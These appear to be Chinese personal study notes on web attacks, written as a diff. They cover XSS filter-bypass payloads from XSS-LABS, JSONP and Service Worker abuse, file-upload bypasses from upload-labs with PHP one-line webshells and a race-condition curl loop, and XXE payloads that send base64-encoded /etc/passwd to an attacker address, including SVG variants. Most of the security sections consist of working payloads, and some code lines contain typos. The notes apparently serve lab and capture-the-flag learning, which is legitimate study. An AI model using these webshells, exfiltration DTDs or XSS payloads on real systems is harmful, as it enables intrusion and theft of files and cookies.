+	window: window 对象代表浏览器窗口。您可以使用它来操作浏览器窗口的各个方面，例如导航、打开新窗口等。
+
+	location: location 对象表示当前页面的 URL 信息。您可以使用它来获取和修改当前页面的 URL。
+
+	navigator: navigator 对象包含有关浏览器的信息。您可以使用它来检测浏览器类型和版本。
+
+	console: console 对象用于向浏览器控制台输出信息，用于调试和记录。
+
+	XMLHttpRequest（XHR）: 这是一个用于向服务器发送 HTTP 请求的对象，通常用于异步加载数据或与服务器进行通信。
+
+	localStorage 和 sessionStorage: 这两个对象用于在客户端存储数据，分别用于本地存储和会话存储。
+
+	setTimeout 和 setInterval: 这两个函数用于设置定时器，执行一段代码或函数在指定的时间后执行或定期执行。
+
+	alert、prompt 和 confirm: 这些函数用于与用户交互，分别用于显示警告框、输入框和确认框。
+
+	Math: Math 对象提供了许多数学函数，用于执行各种数学计算。
+
+	这些关键字和对象可以用于创建交互性和动态性的网页。然而，请谨慎使用它们，以确保您的网页保持安全性和性能。不正当使用这些关键字和对象可能会导致安全漏洞或性能问题。
+
+
+
+
+	XSS-LABS闯关：
+<script>alert()</script>
+<img src=1 onerror=alert(1)>
+">  <script>alert()</script>  <"		(闭合绕过 )
+'onclick='alert(1)				(绕过html实体化)
+' onfocus=javascript:alert() '			(onfocus可以绕过html实体化（即<>号的过滤）)
+"> <a href="javascript:alert(1)"> 		(插入标签达到js执行，前提是闭合号<"">没失效)
+"> <sCript>alert()</sCript> <"			(大小写绕过)
+"> <a hrehreff=javasscriptcript:alert()>x</a> <"(双写绕过)
+
+javascript:alert(1)	转化为html字符实体
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
+
+javascr	ipt:alert(1)				（中间加TAB键）
+
+"onclick=alert(1) type="type			（改变属性）
+
+<img
+src=1
+onerror=alert(1)>				（过滤空格时，用换行符%0A代替）
+
+	(总结：直接注入，闭合绕过，onclick/onfocus绕过html实体化，大小写绕过，双写绕过，TAB键绕过，换行符%0A绕过，javascript:伪协议，编码绕过)
+
+
+
+
+！！！知识点2：同源策略	JSONP（实现跨域读取数据）
+
+	同源策略访问条件：
+			协议相同
+			端口相同
+			域名相同
+
+	JSONP
+
+跨域数据请求：JSONP允许从一个域请求来自另一个域的数据，而这通常受同源策略的限制。这对于从不同域的服务器获取数据非常有用，例如从第三方API获取数据。
+
+回调函数：在JSONP请求中，客户端会在请求中指定一个回调函数的名称，该函数将用于处理从服务器返回的数据。服务器将数据包装在函数调用中，使其成为有效的JavaScript代码。
+
+动态创建<script>标签：JSONP请求通常通过创建一个<script>标签来实现。<script>标签的src属性包含要请求的资源URL，以及指定的回调函数名称作为查询参数。
+
+服务器响应：服务器在接收到JSONP请求后，将数据包装在回调函数中，并作为响应的内容返回给客户端。这样，客户端的页面可以接收并执行该响应，从而获取到数据。
+
+安全性问题：JSONP存在一些安全性问题，因为它涉及将第三方脚本嵌入到页面中，可能会导致恶意脚本注入。因此，开发人员应该小心使用JSONP，并确保只从受信任的源获取数据。
+
+限制：JSONP只支持GET请求，而不支持POST等其他HTTP方法。
+
+
+<html>					（www.bluesea.com的index.html）
+<head>
+<meta charset="utf-8">
+<script>
+	//在页面加载完成后，为页面添加标签<script>,加载跨域的 js 文件（虽然是 php 文件），
+	//但是标签<script>将该 php 文件的输出当作 js 文件
+	//加载时通过 URL 参数 cbf 提交回调函数 foo 给 jsonp.php
+window.onload = function () {
+	var script = document.createElement("script");
+	script.src = "http://data.bluesea.com/xd/jsonp.php?cbf=foo";
+	document.body.appendChild(script);
+};
+var mydata = ""; //定义全局变量 mydata
+	//定义回调函数，该函数被传递给跨域 js 文件，让其中的代码调用
+function foo(result) {
+	mydata = result;
+}
+	//定义按钮点击的事件响应函数，功能是修改页面中的文本
+function loadData() {
+	document.getElementById("myDiv").innerHTML = mydata;
+}
+</script>
+</head>
+<body>
+<div id="myDiv">使用 JSONP 修改该文本内容</div>
+<button type="button" onclick="loadData()">修改内容</button>
+</body>
+</html>
+
+
+<?php					(data.bluesea.com的jsonp.php)
+header('Content-type: text/javascript');
+//获取回调函数名
+$cbf = htmlspecialchars($_GET['cbf']);
+//json 数据
+$jdata = '["宜将剩勇追穷寇，不可沽名学霸王！"]';
+//输出 json 格式的函数
+echo $cbf."($jdata)";
+?>
+
+
+
+
+！！！知识点3：Service Worker	(保存js文件来提升页面打开速度)	（可利用有XSS漏洞的页面，创建恶意url，诱导目标点击，在目标电脑上保存恶意js文件，并诱导目标访问恶意网站运行js文件，从而获取cookie）
+
+
+	恶意url：	(在目标电脑上注册Service Worker，保存恶意js文件)
+https://data.bluesea.com/sw/search.php?q-<script>navigator.servicelorker.register("/sw/jsonp.php?cbf=importScripts('https://www.bluesea.com/sw/sw.js')//");</script>
+
+http://data.bluesea.com/sw/index.html
+
+
+	sw.js分为三大部分：install事件	activate事件	fetch事件
+例：
+//监控 instalI 事件
+self.addEventListener('install',function (event){
+	console.log("install")
+})
+
+//监控 activate 事件
+self.addEventListener('activate'.function(event){
+	console.log("activate")
+})
+
+//监控 fetch 事件
+self.addEventListener('fetch',function (event){
+	var req = event.request.clone(
+	if(reg.url.index0f (".html")>0){
+		if(req.url.index0f("#xy82z36fh")<0){
+			body = '<script>alert(document.domain);window.location.href="'+req.url+'#xy82z36fh";window.location.reload();</script>'
+			init = {headers:{'Content-Type':'text/html'}}
+			res = new Response (body, init)
+			event.respondWith(res)
+		}
+	}
+})
+
+								(前提：目标网站有XSS漏洞且有JSONP文件)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+文件上传漏洞		（上传恶意文件，php，phtml，pht）	（文件上传后会生成一个数组，包含name\type\tmp_name\error\size，并把文件保存在系统的临时目录中）
+
+	条件竞争漏洞
+		在文件上传至服务器指定目录后，程序检测文件之前，访问上传的PHP文件
+		<?php system($_GET["c"]);?>	
+		<?php @eval($_POST["c"]);?>	(一句话木马，蚁剑连接格式)
+		GIF89a? <script language="php">eval($_POST[1])</scrip
+
+		连接脚本
+#!/bin/bash
+while [ "1" = "1" ]
+do
+	curl -s -o /dev/null "http://192.168.184.180/uf/files/1.php"
+done
+
+		批量处理
+ps -ef | grep openurl | grep -v grep | awk '{print2}' | xargs kill
+
+
+
+
+	绕过上传限制	（将一个xxxxxxa.php.xxx文件压缩成a.zip,在010editer把文件名改为../../a.php.xxx实现路径穿越）		（在Apache 2.2.25中存在，只要文件名中含有.php，就会被认为是php文件）
+
+
+
+
+	upload-labs
+
+在burp中拦截修改文件后缀			（前端过滤绕过）
+在burp中拦截修改Content-Type		（只验证Content-Type，文件类型绕过）
+.php3/4/5/7				（黑名单绕过）
+
+.htaccess配置文件			（超文本入口，前提：Apache的配置文件httpd.conf中AllowOverride项为All，即.htaccess配置文件不会被过滤）		（不可以添加文件头）
+	内容：SetHandler application/x-httpd-php	（该目录下的所有文件都当作PHP文件执行）
+
+.user.ini配置文件			（只能被FASTCGI处理，靶机只能运行nginx和PHP-FPM）														（可以添加文件头）
+	内容：auto_prepend_file=1.jpg	（上传的1.jpg会存在readme.php里，PHP每五分钟读取用户的ini文件）
+	(原理是会在执行所有的php文件之前包含.user.ini所指定的文件，所以前提是含有.user.ini的文件夹下需要有正常的php文件)
+
+.PHP)					（大小写绕过）
+.php )					（后面加空格绕过）
+.php.					（点绕过）
+.php::$DATA				（::$DATA绕过，前提：Windows+PHP）
+.php. .					（点+空格+点绕过）
+.phphpp					（双写绕过）
+.php%00					（00截断）
+phtml
+phtm
+pht
+phps
+
+GIF89a					（文件头绕过）
+
+图片马绕过fread()			（fread()读取文件前两个字节来判断文件类型，且需要有文件包含漏洞才能运行图片中的木马，图片马制作：记事本在最后加恶意代码）
+图片马绕过getimagesiza()			（getimagesiza()函数判断文件类型，方法同上）
+图片马绕过exifimagetype()		（exifimagetype()函数判断文件类型，同上）
+图片马绕过二次渲染			（二次渲染会对图片进行压缩，恶意代码需要加在图片内容中）
+条件竞争
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+XML外部实体注入（XXE）
+
+
+
+
+
+
+
+	基础：XML 被设计用来传输和存储数据，其焦点是数据的内容。
+		   XML 文档结构包括三部分：XML 声明、文档类型定义（DTD，可选）、文档元素
+例：
+<!--XML 声明-->																			
+<?xml version="1.0"?>																		XML标志（相当于<?php ?>）
+
+<!--文档类型定义-->																		
+<!DOCTYPE note [ 		<!--定义此文档是 note 类型的文档，note 也称之为根元素-->				相当于类（class note）
+<!ELEMENT note (to,from,heading,body)> 		<!--定义 note 元素有四个元素-->					元素相当于属性
+<!ELEMENT to (#PCDATA)> 		<!--定义 to 元素为”#PCDATA”类型-->
+<!ELEMENT from (#PCDATA)> 		<!--定义 from 元素为”#PCDATA”类型-->
+<!ELEMENT head (#PCDATA)>	 	<!--定义 head 元素为”#PCDATA”类型-->
+<!ELEMENT body (#PCDATA)> 		<!--定义 body 元素为”#PCDATA”类型-->
+<!ENTITY xxe "test">																		普通实体（相当于变量 xxe='test'）
+<!ENTITY %para SYSTEM "file:///1234.dtd"> 		<!-- 定义外部参数实体 -->						参数实体
+%para; 																					引用参数实体
+]>
+
+<!--文档元素-->																			
+<note>																					相当于对象
+<to>Dave</to>																			属性值
+<from>Tom</from>
+<head>Reminder</head>
+<body>You are a good man</body>
+<pass>&xxe</pass>																		会被解析成test（变量前加&）
+</note>
+
+
+内部的 DOCTYPE 声明，语法如下：
+<!DOCTYPE 根元素 [元素声明]>
+
+外部文档声明，语法如下：
+<!DOCTYPE 根元素 SYSTEM "文件名">				（外部文档声明分为 SYSTEM 和 PUBLIC 两种。SYSTEM 引用本地计算机文件，PUBLIC引用网络上公共计算机文件）
+
+！！！
+元素定义为	<!ENTITY xxe SYSTEM "file:///etc/passwd">										（使用&xxe时会被替换成 passwd 文件的内容）
+			<!ENTITY xxe PUBLIC "http://192.168.184.200/eval.php">
+！！！
+
+！！！
+ XML 解析器不会解析同级参数实体的内容
+例1：
+<?xml version="1.0"?>
+<!DOCTYPE message [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % send SYSTEM "http://192.168.184.150:1234/?a=%file;">
+%send;
+]>																						（ send 与 file 同级，引用 send 时 %file 不解析，无法读取 passwd 文件）
+
+例2：
+<?xml version="1.0"?>
+<!DOCTYPE message [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.184.150:1234/?a=%file;'>">
+%start;
+%send;
+]>																						（ send 与 file 不同级，可以解析，&#x25; 为%）
+
+利用：																																blind XXE（服务器没有回显时使用，服务器主动向我们发送数据）
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">	（test.dtd）
+<!ENTITY % start "<!ENTITY &#37; send SYSTEM 'http://192.168.184.150:1234?p=%file;'>">
+
+<!DOCTYPE message [
+<!ENTITY % remote SYSTEM "http://192.168.184.150/test.dtd">
+%remote;
+%start;
+%send;
+]>																						（发送给服务器解析，可得到任意文件）
+
+解析完后：
+<!DOCTYPE message [
+<!ENTITY % remote SYSTEM "http://192.168.184.150/test.dtd">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % start "<!ENTITY &#37; send SYSTEM 'http://192.168.184.150:1234?p=%file;'>">
+<!ENTITY % send SYSTEM 'http://192.168.184.150:1234?p=php://filter/read=convert.base64-encode/resource=file:///etc/passwd;'>
+http://192.168.184.150:1234?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246......
+]>																						（数据将发送给攻击机）
+！！！
+
+
+
+
+
+
+
+	利用SVG进行XXE（服务器对SVG进行了解析就可以尝试XXE攻击）
+
+
+SVG(Scalable Vector Graphics)是一种基于 XML 的二维矢量图形格式
+
+例：s1.svg
+<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg" version="1.1">
+<rect width="100%" height="100%" stroke="red" stroke-width="4" fill="yellow" />
+<circle cx="150" cy="100" r="80" fill="green" />
+<text x="150" y="115" font-size="16" text-anchor="middle" fill="white">
+BLUESEA SVG
+</text>
+</svg>
+
+例：s2.svg																				（加入普通实体读取本地文件）
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note[
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="500" height="200">
+<text x="10" y="20">&file;</text>
+
+
+！！！				blind XXE
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT svg ANY >
+<!ENTITY % remote SYSTEM "http://192.168.184.150/xxe.dtd" >
+%remote;%data;
+]>
+<svg height="100" width="1000">
+&res;
+</svg>
+
+<!ENTITY % show SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd" >
+<!ENTITY % data "<!ENTITY res SYSTEM 'http://192.168.184.150:1234/?%show;'>">
+！！！
+
+
+ 					SVG 文件中还可以嵌入 JS 代码，也能进行 XSS 攻击
+例：
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="150" height="100">
+<circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="green" />
+<script>alert(1)</script>
+</svg>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
